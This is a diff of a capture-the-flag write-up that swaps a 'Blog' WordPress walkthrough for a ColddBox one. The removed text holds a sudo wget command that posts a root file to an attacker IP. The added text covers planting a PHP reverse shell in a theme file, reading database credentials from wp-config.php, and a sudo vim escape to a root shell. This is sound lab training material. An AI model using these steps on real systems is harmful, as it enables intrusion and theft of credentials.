@@ -136,127 +136,76 @@ C0ldd:9876543210
 
 Now we can use this credentials to log in wordpress and ssh.
 
+<figure><img src=".gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>
 
+Check user list, to see them and theirs role/permissions:
 
+<figure><img src=".gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>
 
+Very good, C0ldd is administrator.
 
-We can launch wp-scan to give info from wordpress:
+Now, we need to access at machine using web shell, find it on our kali web-shells folder or use pentester monkey website:
 
-```bash
-wpscan --url http://blog.thm -e u 
-```
+<figure><img src=".gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>
 
-```bash
-Interesting Finding(s):
+We need to edit it using our credentials (LHOST and LPORT):
 
-[+] Headers
- | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
- | Found By: Headers (Passive Detection)
- | Confidence: 100%
+<div align="left">
 
-[+] robots.txt found: http://blog.thm/robots.txt
- | Interesting Entries:
- |  - /wp-admin/
- |  - /wp-admin/admin-ajax.php
- | Found By: Robots Txt (Aggressive Detection)
- | Confidence: 100%
+<figure><img src=".gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>
 
-[+] XML-RPC seems to be enabled: http://blog.thm/xmlrpc.php
- | Found By: Direct Access (Aggressive Detection)
- | Confidence: 100%
- | References:
- |  - http://codex.wordpress.org/XML-RPC_Pingback_API
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
- |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+</div>
 
-[+] WordPress readme found: http://blog.thm/readme.html
- | Found By: Direct Access (Aggressive Detection)
- | Confidence: 100%
+and upload it on media library page:
 
-[+] Upload directory has listing enabled: http://blog.thm/wp-content/uploads/
- | Found By: Direct Access (Aggressive Detection)
- | Confidence: 100%
+<figure><img src=".gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>
 
-[+] The external WP-Cron seems to be enabled: http://blog.thm/wp-cron.php
- | Found By: Direct Access (Aggressive Detection)
- | Confidence: 60%
- | References:
- |  - https://www.iplocation.net/defend-wordpress-from-ddos
- |  - https://github.com/wpscanteam/wpscan/issues/1299
+But, trying to change extension, upload doesn't work.
 
-[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
- | Found By: Rss Generator (Passive Detection)
- |  - http://blog.thm/feed/, <generator>https://wordpress.org/?v=5.0</generator>
- |  - http://blog.thm/comments/feed/, <generator>https://wordpress.org/?v=5.0</generator>
+<figure><img src=".gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>
 
-[+] WordPress theme in use: twentytwenty
- | Location: http://blog.thm/wp-content/themes/twentytwenty/
- | Last Updated: 2023-03-29T00:00:00.000Z
- | Readme: http://blog.thm/wp-content/themes/twentytwenty/readme.txt
- | [!] The version is out of date, the latest version is 2.2
- | Style URL: http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3
- | Style Name: Twenty Twenty
- | Style URI: https://wordpress.org/themes/twentytwenty/
- | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
- | Author: the WordPress team
- | Author URI: https://wordpress.org/
- |
- | Found By: Css Style In Homepage (Passive Detection)
- |
- | Version: 1.3 (80% confidence)
- | Found By: Style (Passive Detection)
- |  - http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3, Match: 'Version: 1.3'
+Then, we can try to use wordpress themes or plugins how vector to inject our web-shell.
 
-[+] Enumerating Users (via Passive and Aggressive Methods)
- Brute Forcing Author IDs - Time: 00:01:14 <=============================================================================================================================================================> (10 / 10) 100.00% Time: 00:01:14
+Starting with themes, we edit header.php page in the twentyfifteen theme using the same php web-shell:
 
-[i] User(s) Identified:
+<figure><img src=".gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>
 
-[+] kwheel
- | Found By: Author Posts - Author Pattern (Passive Detection)
- | Confirmed By:
- |  Wp Json Api (Aggressive Detection)
- |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
- |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
- |  Login Error Messages (Aggressive Detection)
+Update file, run netcat listener on the same port '1234':
 
-[+] bjoel
- | Found By: Author Posts - Author Pattern (Passive Detection)
- | Confirmed By:
- |  Wp Json Api (Aggressive Detection)
- |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
- |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
- |  Login Error Messages (Aggressive Detection)
+<div align="left">
 
-[+] Karen Wheeler
- | Found By: Rss Generator (Passive Detection)
- | Confirmed By: Rss Generator (Aggressive Detection)
+<figure><img src=".gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>
 
-[+] Billy Joel
- | Found By: Rss Generator (Passive Detection)
- | Confirmed By: Rss Generator (Aggressive Detection)
-```
+</div>
 
+Go to: [http://coldbox.thm/wp-content/themes/twentyfifteen/header.php](http://coldbox.thm/wp-content/themes/twentyfifteen/header.php)
 
+<figure><img src=".gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>
 
-
-
-We're in, try to find user.txt flag using find command:\
-
+We can upgrade this to a fully interactive shell by running:
 
 ```bash
-find / -type f -iname "*flag.txt" 2>/dev/null
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
 ```
 
-<figure><img src=".gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>
+and retrieve credentials inside wp-config.php file.
+
+```bash
+cat /var/www/html/wp-config.php | grep "DB_USER"
+#define('DB_USER', 'c0ldd');
+cat /var/www/html/wp-config.php | grep "DB_PASSWORD"
+#define('DB_PASSWORD', 'cybersecurity');
+su c0ldd #inser psw and read flag.
+```
+
+we know credential for access how c0ldd user and read user.txt flag
 
 <details>
 
-<summary>🚩 Flag 1 (user_flag.txt)</summary>
+<summary>🚩 Flag 1 (user.txt)</summary>
 
-057c67131c3d5e42dd5cd3075b198ff6
+RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
 
 </details>
 
@@ -264,27 +213,23 @@ find / -type f -iname "*flag.txt" 2>/dev/null
 
 We can do sudo -l command to discover user's permissions.
 
+<figure><img src=".gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>
 
+We see that c0ldd user has root permissions for these commands, we can use gtfobins to find them.
 
-
-
-
-
-
-
-
-
-<figure><img src=".gitbook/assets/image (54).png" alt=""><figcaption><p>find IP and listen on port 4444</p></figcaption></figure>
+[https://gtfobins.github.io/gtfobins/vim/](https://gtfobins.github.io/gtfobins/vim/) using vim sudo command below, we obtain a root permission:
 
 ```bash
-sudo /usr/bin/wget http://10.9.80.228:4444 --post-file=/root/root_flag.txt
+sudo vim -c ':!/bin/sh'
 ```
 
-<figure><img src=".gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>
+
+spawn /bin/sh to use shell:
 
 <div align="left">
 
-<figure><img src=".gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>
 
 </div>
 
@@ -292,8 +237,8 @@ Well done! Root flag found!
 
 <details>
 
-<summary>🚩 Flag 2 (root_flag.txt)</summary>
+<summary>🚩 Flag 2 (root.txt)</summary>
 
-b1b968b37519ad1daa6408188649263d
+wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
 
 </details>
